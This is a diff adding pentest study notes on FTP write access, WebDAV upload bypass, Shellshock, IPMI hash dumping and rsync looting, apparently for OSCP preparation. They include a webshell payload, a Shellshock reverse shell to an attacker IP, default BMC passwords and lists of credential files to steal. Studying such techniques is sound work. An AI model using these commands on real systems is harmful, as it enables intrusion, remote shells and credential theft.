@@ -47,6 +47,14 @@ ftp> bye
 Standard credential triad to test: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`.
 Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
+**Write access test after anonymous login:**
+```bash
+# Test for write access after anonymous login
+ftp> put test.txt
+# If successful, the FTP root may overlap with a web root — drop a webshell
+```
+If `put` succeeds, the anonymous user has write access to the FTP directory. This is especially dangerous when the FTP root overlaps with a web server's document root (common on IIS boxes where `C:\inetpub\ftproot` is the same as or a parent of `C:\inetpub\wwwroot`) — uploading a webshell (`.aspx`, `.php`) through FTP then triggering it via HTTP is a well-known OSCP foothold pattern.
+
 **Faster (nxc):**
 ```bash
 nxc ftp <IP> -u anonymous -p anonymous
@@ -2297,3 +2305,254 @@ Source: [xmsec/redis-ssrf (GitHub)](https://github.com/xmsec/redis-ssrf), [Paylo
 | Redis | `redis-cli` | `gopherus` / `redis-ssh` | `CONFIG SET dir/dbfilename` + `SAVE` |
 
 **Note on currency:** All techniques above (UDF privesc, MSSQL linked-server/xp_cmdshell abuse, ODAT's Oracle package abuse, Postgres `COPY PROGRAM`, and Redis unauth `CONFIG SET`/`SAVE`) remain standard, unpatched-by-design *misconfiguration* techniques as of 2026 — they exploit intended administrative functionality rather than a single patchable CVE, which is why they persist in current OSCP-style material.
+
+---
+
+## WebDAV (TCP 80/443)
+
+### Overview
+WebDAV (Web Distributed Authoring and Versioning) extends HTTP with PUT, MOVE, COPY, DELETE, MKCOL, and PROPFIND methods, enabling remote file management over a web server. On OSCP-style targets — especially IIS boxes — WebDAV is a common foothold vector because it allows uploading files to the web root. The classic exploitation pattern is uploading a harmless file type (`.txt`) via PUT, then renaming it to an executable extension (`.aspx`, `.php`) via MOVE to bypass extension-based upload filters.
+
+### Findings
+
+**1. Detection — nmap WebDAV scan**
+```bash
+nmap --script http-webdav-scan -p 80 <target>
+nmap --script http-webdav-scan -p 443 <target>
+```
+The `http-webdav-scan` NSE script sends an `OPTIONS` request and reports which WebDAV methods the server advertises (PUT, MOVE, COPY, DELETE, MKCOL, PROPFIND, etc.), confirming WebDAV is enabled and which operations are permitted.
+Source: https://nmap.org/nsedoc/scripts/http-webdav-scan.html
+
+**2. Detection — davtest (upload capability testing)**
+```bash
+davtest -url http://<target>/webdav/
+davtest -url http://<target>/webdav/ -auth <user>:<password>
+```
+`davtest` automatically tests which file types (`.txt`, `.html`, `.asp`, `.aspx`, `.php`, `.jsp`, `.pl`, `.cgi`, etc.) can be uploaded to the WebDAV directory and which of those uploaded files are then executable by the web server — a one-shot triage of both upload and execution permissions per extension.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
+
+**3. Enumeration — interactive WebDAV shell with cadaver**
+```bash
+cadaver http://<target>/webdav/
+```
+Opens an interactive FTP-like shell for browsing, uploading, downloading, and managing files on the WebDAV share. Supports `ls`, `put`, `get`, `move`, `copy`, `delete`, `mkcol` (create directory) commands. Useful for manual exploration once WebDAV access is confirmed.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
+
+**4. Exploitation — PUT + MOVE bypass (IIS extension filter evasion)**
+```bash
+# Step 1: Upload payload as a permitted file type (.txt)
+curl -X PUT http://<target>/webdav/cmd.txt -d '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c whoami > C:\\inetpub\\wwwroot\\webdav\\output.txt"); %>'
+
+# Step 2: Rename to an executable extension (.aspx) via MOVE
+curl -X MOVE -H 'Destination: http://<target>/webdav/cmd.aspx' http://<target>/webdav/cmd.txt
+```
+Many IIS WebDAV configurations block direct upload of `.aspx`/`.asp` files but allow `.txt`. The MOVE method renames the uploaded file server-side without re-checking the extension filter — a well-documented IIS misconfiguration that persists in OSCP-style lab environments. After the MOVE, browsing to `http://<target>/webdav/cmd.aspx` triggers the payload. The same technique applies to `.php` on Apache/nginx WebDAV setups.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
+
+**5. Authenticated WebDAV upload with curl**
+```bash
+curl -X PUT http://<target>/webdav/shell.aspx -d @shell.aspx -u '<user>:<password>'
+```
+When WebDAV requires authentication (common on Windows/IIS with Basic or NTLM auth), pass credentials with `-u`. If the server accepts the extension directly (no filter), the PUT + MOVE two-step is unnecessary.
+
+**nxc note:** NetExec does not have a native WebDAV module — use `curl`, `cadaver`, or `davtest` for WebDAV interaction.
+
+### Tools table
+| Tool | Purpose |
+|---|---|
+| `nmap` (`http-webdav-scan` NSE) | Detect WebDAV support and advertised methods |
+| `davtest` | Automated upload + execution testing per file extension |
+| `cadaver` | Interactive WebDAV shell (browse, upload, download, move) |
+| `curl` | Manual PUT/MOVE/DELETE requests for precise exploitation |
+
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
+
+---
+
+## CGI-bin / Shellshock (CVE-2014-6271)
+
+### Overview
+Shellshock (CVE-2014-6271) exploits a flaw in Bash's handling of environment variables — specifically, function definitions passed through environment variables are not properly terminated, allowing an attacker to append arbitrary commands that execute when the shell is invoked. CGI scripts (`.sh`, `.pl`, `.cgi`) served by Apache/nginx via `mod_cgi`/`mod_cgid` are the primary attack surface because HTTP headers (User-Agent, Referer, Cookie, Accept-Language, and any custom header) are passed to the CGI process as environment variables, giving remote unauthenticated command execution if the server-side shell is a vulnerable Bash version (< 4.3 patch 25).
+
+### Findings
+
+**1. Discovery — brute force CGI script paths**
+```bash
+gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x sh,pl,cgi
+```
+Brute forces the `/cgi-bin/` directory for common CGI script names with shell/Perl/CGI extensions. Finding a valid script (200 response) is the prerequisite — Shellshock requires a specific CGI endpoint to inject through.
+Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
+
+**2. Discovery — nmap Shellshock detection**
+```bash
+nmap --script http-shellshock --script-args uri=/cgi-bin/status.sh -p 80 <target>
+```
+The `http-shellshock` NSE script sends the Shellshock payload in the User-Agent header and checks for evidence of command execution in the response. `uri=` must point to a known/discovered CGI script path — the script does not brute force paths on its own.
+Source: https://nmap.org/nsedoc/scripts/http-shellshock.html
+
+**3. Detection — manual curl test**
+```bash
+curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://<target>/cgi-bin/script.sh
+```
+The payload `() { :; };` is a function definition that Bash parses from the environment variable; the trailing `echo; /usr/bin/id` is the injected command that executes after the function definition due to the parsing flaw. The leading `echo;` outputs a blank line that acts as the HTTP header/body separator, ensuring the command output appears in the response body. A successful response showing `uid=...` confirms the target is vulnerable.
+Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
+
+**4. Exploitation — reverse shell via User-Agent**
+```bash
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" http://<target>/cgi-bin/script.sh
+```
+Replaces the detection payload with a standard Bash reverse shell one-liner. Set up a listener (`nc -lvnp 4444`) before sending. The shell runs as the web server user (typically `www-data` or `apache`).
+Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
+
+**5. Alternative injectable headers**
+```bash
+# Referer header
+curl -H "Referer: () { :; }; /usr/bin/id > /var/www/html/output.txt" http://<target>/cgi-bin/script.sh
+
+# Cookie header
+curl -H "Cookie: () { :; }; /usr/bin/id > /tmp/output.txt" http://<target>/cgi-bin/script.sh
+```
+Any HTTP header that the web server maps into the CGI environment is a valid injection point — not just User-Agent. Referer, Cookie, Accept-Language, and custom headers all reach the CGI process as environment variables. If User-Agent-based injection is filtered/WAF-blocked, try other headers.
+Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
+
+### Tools table
+| Tool | Purpose |
+|---|---|
+| `gobuster` | Brute force `/cgi-bin/` for valid CGI script paths |
+| `nmap` (`http-shellshock` NSE) | Automated Shellshock detection against a known CGI endpoint |
+| `curl` | Manual header injection for detection and exploitation |
+| `nmap` (`http-enum` NSE) | Generic web content discovery that may find `/cgi-bin/` entries |
+
+Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
+
+---
+
+## IPMI (UDP 623)
+
+### Overview
+IPMI (Intelligent Platform Management Interface) on UDP 623 provides out-of-band hardware management (BMC — Baseboard Management Controller). IPMI 2.0's RAKP (Remote Authenticated Key-Exchange Protocol) authentication handshake has a protocol-level design flaw: during the RAKP Message 2 exchange, the BMC sends a salted HMAC derived from the user's password hash back to any client that initiates authentication — **by design, not by misconfiguration** — allowing offline cracking of BMC user passwords without ever completing a login. Default credentials are also extremely common on BMCs.
+
+### Findings
+
+**1. Detection — nmap IPMI version scan**
+```bash
+nmap -sU -p 623 --script ipmi-version <target>
+```
+Confirms the IPMI service is listening on UDP 623 and reports the IPMI protocol version (1.5 or 2.0). IPMI 2.0 is the version vulnerable to the RAKP hash-disclosure technique below.
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+**2. IPMI 2.0 RAKP hash dumping**
+```bash
+# Metasploit (lab/HTB only — exam: single-target restriction applies)
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS <target>
+run
+```
+The `ipmi_dumphashes` module initiates RAKP authentication handshakes for a list of common usernames (or a custom wordlist) and captures the HMAC-SHA1/HMAC-MD5 hash the BMC returns in RAKP Message 2. These hashes can then be cracked offline. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine designated for Metasploit use — consider whether the IPMI host is that machine before running.**
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+**3. ipmitool — authenticated enumeration**
+```bash
+ipmitool -I lanplus -H <target> -U admin -P admin user list
+ipmitool -I lanplus -H <target> -U admin -P admin user summary
+ipmitool -I lanplus -H <target> -U admin -P admin lan print 1
+ipmitool -I lanplus -H <target> -U admin -P admin chassis status
+```
+Once valid credentials are obtained (via cracking or defaults), `ipmitool` enumerates BMC users, network configuration, and hardware status. `-I lanplus` uses the IPMI 2.0 (RMCP+) interface.
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+**4. Default credentials to try**
+| Vendor | Username | Password |
+|---|---|---|
+| Generic / Supermicro | `ADMIN` | `ADMIN` |
+| Generic | `admin` | `admin` |
+| Dell iDRAC | `root` | `calvin` |
+| HP iLO | `Administrator` | (set during setup, but often `Administrator`) |
+| Generic | `Administrator` | `Administrator` |
+
+Always try these before attempting hash dumping — BMC default credentials are left unchanged far more often than they should be.
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+**5. Cracking IPMI RAKP hashes**
+```bash
+hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
+```
+Hashcat mode `7300` handles IPMI2 RAKP HMAC-SHA1 hashes. The hash format output by Metasploit's `ipmi_dumphashes` module is directly compatible with hashcat without reformatting.
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+### Tools table
+| Tool | Purpose |
+|---|---|
+| `nmap` (`ipmi-version` NSE) | Detect IPMI service and protocol version |
+| Metasploit `ipmi_dumphashes` | Capture RAKP password hashes via the protocol-level flaw |
+| `ipmitool` | Authenticated BMC interaction (user enum, config, chassis control) |
+| `hashcat` (`-m 7300`) | Crack captured IPMI 2.0 RAKP hashes offline |
+
+Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
+
+---
+
+## Rsync (TCP 873)
+
+### Overview
+Rsync (TCP 873) is a file synchronization service that can expose named "modules" — each mapping to a server-side directory path. When modules are configured without authentication (`auth users` / `secrets file` not set), any client can list, download, and potentially upload files. On OSCP-style targets, anonymous rsync access frequently leaks configuration files, SSH keys, credentials, or provides write access to web roots or home directories.
+
+### Findings
+
+**1. Detection — nmap rsync module listing**
+```bash
+nmap -p 873 --script rsync-list-modules <target>
+```
+The `rsync-list-modules` NSE script connects to the rsync daemon and lists all advertised module names — equivalent to the manual listing below but integrated into an nmap scan workflow.
+Source: https://nmap.org/nsedoc/scripts/rsync-list-modules.html
+
+**2. Module listing — rsync native client**
+```bash
+rsync --list-only rsync://<target>/
+```
+Connects to the rsync daemon on port 873 and lists all available modules (share names). Each module name maps to a server-side directory configured in `/etc/rsyncd.conf`. Modules may or may not require authentication — the listing itself is typically unauthenticated.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
+
+**3. Anonymous download — entire module contents**
+```bash
+rsync -av rsync://<target>/module_name/ ./loot/
+```
+Recursively downloads the entire contents of a module to a local directory. `-a` preserves permissions/timestamps/symlinks (archive mode); `-v` enables verbose output. If the module is not password-protected, this is effectively anonymous read access to the mapped directory.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
+
+**4. List files in a module without downloading**
+```bash
+rsync --list-only rsync://<target>/module_name/
+rsync --list-only -r rsync://<target>/module_name/
+```
+The first form lists top-level contents; adding `-r` recurses into subdirectories. Useful for triaging what's available before downloading everything.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
+
+**5. Check for writable modules (upload test)**
+```bash
+rsync ./test.txt rsync://<target>/module_name/test.txt
+```
+Attempts to upload a small test file to the module. If it succeeds (no error), the module is writable — a direct path to dropping webshells (if the module maps to a web root), planting SSH keys (if it maps to a home directory), or modifying configuration files.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
+
+**6. Authenticated access**
+```bash
+rsync -av rsync://username@<target>/module_name/ ./loot/
+```
+When a module requires authentication, rsync prompts for the password. Credentials may be found in other loot, or common defaults can be tried.
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
+
+**7. Key files to look for after download**
+Once a module's contents are downloaded, prioritize:
+- SSH keys: `id_rsa`, `id_ed25519`, `authorized_keys`, `.ssh/` directories
+- Configuration files: `.htpasswd`, `wp-config.php`, `web.config`, `shadow`, `passwd`
+- Credential stores: `.bash_history`, `.my.cnf`, `.pgpass`, `.env`, `credentials.xml`
+- Web roots: if the module maps to `/var/www/html` or similar, upload a webshell via the writable-module technique above
+
+### Tools table
+| Tool | Purpose |
+|---|---|
+| `nmap` (`rsync-list-modules` NSE) | Detect rsync and list available modules |
+| `rsync` (native client) | List modules, browse contents, download/upload files |
+
+Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
